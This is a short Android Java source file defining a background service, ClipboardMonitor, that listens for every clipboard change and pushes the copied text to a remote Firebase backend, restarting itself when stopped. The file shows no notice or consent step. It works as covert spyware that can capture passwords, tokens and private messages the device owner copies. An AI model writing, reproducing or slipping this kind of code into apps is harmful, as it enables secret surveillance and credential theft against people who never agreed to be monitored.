
package com.example.app;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class ClipboardMonitor extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.addPrimaryClipChangedListener(() -> {
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData != null && clipData.getItemCount() > 0) {
                        CharSequence clip = clipData.getItemAt(0).getText();
                        if (clip != null) {
                            FirebaseClient.pushLog(getApplicationContext(), "clipboard", String.valueOf(clip));
                        }
                    }
                }
            });
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
